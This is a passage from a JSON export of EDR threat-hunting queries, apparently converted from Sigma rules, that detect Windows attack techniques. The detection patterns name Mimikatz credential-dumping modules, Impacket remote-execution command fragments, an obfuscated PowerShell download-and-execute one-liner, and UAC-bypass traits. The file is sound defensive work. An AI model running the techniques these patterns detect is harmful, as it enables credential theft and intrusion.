            "description": "Detects attackers using tooling with bad opsec defaults.\nE.g. spawning a sacrificial process to inject a capability into the process without taking into account how the process is normally run.\nOne trivial example of this is using rundll32.exe without arguments as a sacrificial process (default in CS, now highlighted by c2lint), running WerFault without arguments (Kraken - credit am0nsec), and other examples.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Bad Opsec Defaults Sacrificial Processes With Improper Arguments",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\WerFault.exe\" and tgt.process.cmdline contains \"WerFault.exe\") or (tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"rundll32.exe\") or (tgt.process.image.path contains \"\\regsvcs.exe\" and tgt.process.cmdline contains \"regsvcs.exe\") or (tgt.process.image.path contains \"\\regasm.exe\" and tgt.process.cmdline contains \"regasm.exe\") or (tgt.process.image.path contains \"\\regsvr32.exe\" and tgt.process.cmdline contains \"regsvr32.exe\")) and (not ((src.process.image.path contains \"\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{\" and tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"rundll32.exe\") or ((src.process.image.path contains \"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Application\\\" or src.process.image.path contains \"\\AppData\\Local\\Google\\Chrome\\Application\\\") and src.process.image.path contains \"\\Installer\\setup.exe\" and src.process.cmdline contains \"--uninstall \" and tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"rundll32.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 227
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a set of suspicious network related commands often used in recon stages",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087",
                "t1082"
            ],
            "name": "Network Reconnaissance Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"nslookup\" and tgt.process.cmdline contains \"_ldap._tcp.dc._msdcs.\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 228
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Checks whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Execution Of Non-Existing File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((not tgt.process.image.path contains \"\\\") and (not (not (tgt.process.image.path matches \"\\.*\") or (tgt.process.image.path in (\"-\",\"\")) or ((tgt.process.image.path in (\"System\",\"Registry\",\"MemCompression\",\"vmmem\")) or (tgt.process.cmdline in (\"Registry\",\"MemCompression\",\"vmmem\")))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 229
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\nThis is used as an obfuscation and masquerading techniques.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Potential Defense Evasion Via Right-to-Left Override",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"\u202e\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 230
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects use of chcp to look up the system locale value as part of host discovery",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1614"
            ],
            "name": "Console CodePage Lookup Via CHCP",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\cmd.exe\" and (src.process.cmdline contains \" -c \" or src.process.cmdline contains \" /c \" or src.process.cmdline contains \" \u2013c \" or src.process.cmdline contains \" \u2014c \" or src.process.cmdline contains \" \u2015c \" or src.process.cmdline contains \" -r \" or src.process.cmdline contains \" /r \" or src.process.cmdline contains \" \u2013r \" or src.process.cmdline contains \" \u2014r \" or src.process.cmdline contains \" \u2015r \" or src.process.cmdline contains \" -k \" or src.process.cmdline contains \" /k \" or src.process.cmdline contains \" \u2013k \" or src.process.cmdline contains \" \u2014k \" or src.process.cmdline contains \" \u2015k \") and tgt.process.image.path contains \"\\chcp.com\" and (tgt.process.cmdline contains \"chcp\" or tgt.process.cmdline contains \"chcp \" or tgt.process.cmdline contains \"chcp  \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 231
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a specific OneLiner to download and execute powershell modules in memory.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1562"
            ],
            "name": "Obfuscated PowerShell OneLiner Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\powershell.exe\" and (tgt.process.cmdline contains \"http://127.0.0.1\" and tgt.process.cmdline contains \"%{(IRM $_)}\" and tgt.process.cmdline contains \".SubString.ToString()[67,72,64]-Join\" and tgt.process.cmdline contains \"Import-Module\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 232
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Potential Process Injection Via Msra.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\msra.exe\" and src.process.cmdline contains \"msra.exe\" and (tgt.process.image.path contains \"\\arp.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\netstat.exe\" or tgt.process.image.path contains \"\\nslookup.exe\" or tgt.process.image.path contains \"\\route.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\whoami.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 233
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "detects the usage of path traversal in conhost.exe indicating possible command/argument confusion/hijacking",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Conhost.exe CommandLine Path Traversal",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.cmdline contains \"conhost\" and tgt.process.cmdline contains \"/../../\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 234
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Dnx.EXE. The Dnx utility allows for the execution of C# code.\nAttackers might abuse this in order to bypass application whitelisting.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1027"
            ],
            "name": "Potential Application Whitelisting Bypass via Dnx.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\dnx.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 235
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using MSConfig Token Modification - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\")) and src.process.image.path contains \"\\AppData\\Local\\Temp\\pkgmgr.exe\" and tgt.process.cmdline=\"\\\"C:\\Windows\\system32\\msconfig.exe\\\" -5\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 236
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Access to Domain Group Policies stored in SYSVOL",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552"
            ],
            "name": "Suspicious SYSVOL Domain Group Policy Access",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\SYSVOL\\\" and tgt.process.cmdline contains \"\\policies\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 237
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1021"
            ],
            "name": "HackTool - Potential Impacket Lateral Movement Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\wmiprvse.exe\" or src.process.image.path contains \"\\mmc.exe\" or src.process.image.path contains \"\\explorer.exe\" or src.process.image.path contains \"\\services.exe\") and (tgt.process.cmdline contains \"cmd.exe\" and tgt.process.cmdline contains \"/Q\" and tgt.process.cmdline contains \"/c\" and tgt.process.cmdline contains \"\\\\127.0.0.1\\\" and tgt.process.cmdline contains \"&1\")) or ((src.process.cmdline contains \"svchost.exe -k netsvcs\" or src.process.cmdline contains \"taskeng.exe\") and (tgt.process.cmdline contains \"cmd.exe\" and tgt.process.cmdline contains \"/C\" and tgt.process.cmdline contains \"Windows\\Temp\\\" and tgt.process.cmdline contains \"&1\")))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 238
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Commandline to launch powershell with a base64 payload",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious Execution of Powershell with Base64",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \" -e \" or tgt.process.cmdline contains \" -en \" or tgt.process.cmdline contains \" -enc \" or tgt.process.cmdline contains \" -enco\" or tgt.process.cmdline contains \" -ec \")) and (not (tgt.process.cmdline contains \" -Encoding \" or (src.process.image.path contains \"C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\" or src.process.image.path contains \"\\gc_worker.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 239
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detection well-known mimikatz command line arguments",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003",
                "t1003",
                "t1003",
                "t1003",
                "t1003"
            ],
            "name": "HackTool - Mimikatz Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"DumpCreds\" or tgt.process.cmdline contains \"mimikatz\") or (tgt.process.cmdline contains \"::aadcookie\" or tgt.process.cmdline contains \"::detours\" or tgt.process.cmdline contains \"::memssp\" or tgt.process.cmdline contains \"::mflt\" or tgt.process.cmdline contains \"::ncroutemon\" or tgt.process.cmdline contains \"::ngcsign\" or tgt.process.cmdline contains \"::printnightmare\" or tgt.process.cmdline contains \"::skeleton\" or tgt.process.cmdline contains \"::preshutdown\" or tgt.process.cmdline contains \"::mstsc\" or tgt.process.cmdline contains \"::multirdp\") or (tgt.process.cmdline contains \"rpc::\" or tgt.process.cmdline contains \"token::\" or tgt.process.cmdline contains \"crypto::\" or tgt.process.cmdline contains \"dpapi::\" or tgt.process.cmdline contains \"sekurlsa::\" or tgt.process.cmdline contains \"kerberos::\" or tgt.process.cmdline contains \"lsadump::\" or tgt.process.cmdline contains \"privilege::\" or tgt.process.cmdline contains \"process::\" or tgt.process.cmdline contains \"vault::\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 240
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a JAVA process running with remote debugging allowing more than just localhost to connect",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1203"
            ],
            "name": "Java Running with Remote Debugging",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"transport=dt_socket,address=\" and (tgt.process.cmdline contains \"jre1.\" or tgt.process.cmdline contains \"jdk1.\")) and (not (tgt.process.cmdline contains \"address=127.0.0.1\" or tgt.process.cmdline contains \"address=localhost\")))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 241
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a service binary running in a suspicious directory",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Suspicious Service Binary Directory",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\Users\\Public\\\" or tgt.process.image.path contains \"\\$Recycle.bin\" or tgt.process.image.path contains \"\\Users\\All Users\\\" or tgt.process.image.path contains \"\\Users\\Default\\\" or tgt.process.image.path contains \"\\Users\\Contacts\\\" or tgt.process.image.path contains \"\\Users\\Searches\\\" or tgt.process.image.path contains \"C:\\Perflogs\\\" or tgt.process.image.path contains \"\\config\\systemprofile\\\" or tgt.process.image.path contains \"\\Windows\\Fonts\\\" or tgt.process.image.path contains \"\\Windows\\IME\\\" or tgt.process.image.path contains \"\\Windows\\addins\\\") and (src.process.image.path contains \"\\services.exe\" or src.process.image.path contains \"\\svchost.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 242
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility by a parent process that is located in a suspicious location.\nAttackers could instantiate an instance of \"wusa.exe\" in order to bypass User Account Control (UAC). They can duplicate the access token from \"wusa.exe\" to gain elevated privileges.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Wusa.EXE Executed By Parent Process Located In Suspicious Location",
